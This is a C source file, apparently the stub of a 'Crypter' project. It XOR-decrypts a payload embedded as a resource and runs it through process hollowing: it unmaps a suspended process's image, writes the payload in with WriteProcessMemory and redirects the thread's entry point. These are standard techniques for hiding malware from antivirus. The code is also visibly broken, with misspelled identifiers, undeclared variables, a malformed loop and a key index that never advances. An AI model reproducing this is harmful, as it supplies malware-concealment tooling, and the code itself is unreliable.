//
//  stub.c
//  Crypter
//
//  Created by Derek Ta on 11/15/14.
//
//

#include "stub.h"
#include <windows.h>
#include <stdio.h>

typedef void (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);


struct StubData{
    unsigned char * pFileBuffer;
    unsigned long FileSize;
    unsigned char *pKey;
    unsigned int KeySize;
    char FileName[MAX_PATH];
};

/* WINAPI Functions
 * -> SizeofResource(HMODULE hModule, HRSRC hResInfo) = Retrieves size of specified resource in bytes
 * -> LockResource(HGLOBAL hResData) = Pointer to resource in memory
 * -> FindResource(HMODULE hModule(optional), LPCTSTR lpName, LPCTSTR lpType) = Determines the location of resource with
        specified name and type in specified module, if it is null then it searches in the module used to create this process. So it searches in the memory of payload
 /

/* Microsoft Data types
 * -> RT_RCDATA = Application-defined resource
 * ->MAKEINTRESOURCE(10) = RT_RCDATA
 * ->MAKEINTRESOURCE(20) = a standard vxd resource
 * ->make int resource can be used in find resource as the integer identifier of the resource
 */


// Finds the resources assigned in the builder with MAKEINTRESOURCE()
// Loads the stub data into memory
void LoadStruct(struct StubData *sData)
{
    // Resources are read only data
    HRSRC hResource; // Handle to the resource in mem
    HGLOBAL hGlobal; //Handle to loaded resource
    
    //Get file size for stub data
    hResource = FindResource(NULL, MAKEINTRESOURCE(10), RT_RCDATA); // Finds filesize in builder
    if (!hResource)
        exit(EXIT_FAILURE);
    sData->FileSize = sizeOfResource(NULL, hResource);
    
    //Get key size for stub data
    hResource = FindResource(NULL, MAKEINTRESOURCE(20), RT_RCDATA); //Finds keysize in builder
    if(!hResource)
        exit(EXIT_FAILURE);
    sData->KeySize = sizeOfResource(NULL, hResource);
    
    // Map to memory
    hGlobal = LoadResource(NULL, hResource);
    if (!hGlobal)
        exit(EXIT_FAILURE);
    
    // Assign starting point of memory to the buffer
    sData->pKey = (unsigned char*)LockResource(hGlobal);
    if (!sData->pKey)
        exit(EXIT_FAILURE);
    GetModuleFileName(NULL, sData->FileName,MAX_PATH);
    // Retrieves the stub's path
    
}

// Decrypts the file buffer that the stubdata points to
void Decrypt(struct StubData *sData)
{
    // Aes decryption temporarily filled with xor encryption
    int i=0, j=0;
    for (i; i<sData->FileSize, i++)
    {
        *(sData->pFileBuffer+i) ^= *(sData->pKey+j); //Xor the bytes in the file with the key at index j
        
        // Startover when we reach the end of the key
        if (j>=sData->keySize)
            j=0;
        // As it loops through the file, when it reaches the end of the key it restarts
    }
}

/* STARTUPINFO = Specifies main window properties
 * PROCESS_INFORMATION = Information about newly created process and primary thread
 * CONTEXT = Contains start address in relation to the EXE, contains location of kernel32
 */
 
void runPortableExecutable(Struct StubData *sData)
{
    // si,pi, and ctx hold data associated with CreateProcess, essential for process to be created
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    
    PIMAGE_DOS_HEADER dosheader;
    PIMAGE_NT_HEADERS ntheader;
    PIMAGE_SECTION_HEADER sectionheader;
    
    PTRZwUnmapViewOfSection pZwUnmapViewOfSection = NULL;
    
    memset(&si, 0, sizeof(si)); // sets bytes at si pointer
    si.cb = sizeOf(STARTUPINFO);
    ctx.ContextFlags = CONTEXT_FULL;
    
    dosheader = (P_IMAGE_DOS_HEADER)&sData->pFileBuffer[0];
    if (dosheader->e_magic !=IMAGE_DOS_SIGNATURE)
        return;
    ntheader = (P_IMAGE_NT_HEADERS)&sData->pFileBuffer[dosheader->e_lfanew];
    if (ntheader->Signature != IMAGE_NT_SIGNATURE)
        return;
    
    // Start the executable in frozen state to prepare to generate decrypted shellcode
    CreateProcess(NULL, sData->FIleName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    pZwUnmapViewOfSection = (PTRZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    pZwUnmapViewOfSection(pi.hProcess, (void*)ntheader->OptionalHeader.ImageBase);
    
    VirtualAllocEx(pi.hProcess, (void*)ntheader->OptionalHeader.ImageBase, ntheader->OptionalHeader.SIzeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, (void *)ntheader->OptionalHeader.ImageBase, &sData ->pFileBuffer[0], ntheader->OptionalHeader.SizeOfHeaders, NULL);
    
    for(int i=0; i<pinh->FileHeader.NumberOfSections; i++)
    {
        sectionheader = (PIMAGE_SECTION_HEADER)&sData->pFileBuffer[dosheader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADERS)*i];
         WriteProcessMemory(pi.hProcess, (void *)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), &sData->pFileBuffer[pish->PointerToRawData], pish->SizeOfRawData, NULL);
    }
    GetThreadContext(pi.hThread, &ctx);
    ctx.Eax = ntheader->OptionalHeader.ImageBase + ntheader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
}


int APIENTRY WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    struct StubData stub;
    LoadStruct(&stub);
    Decrypt(&stub);
    runPortableExecutable(&stub);
}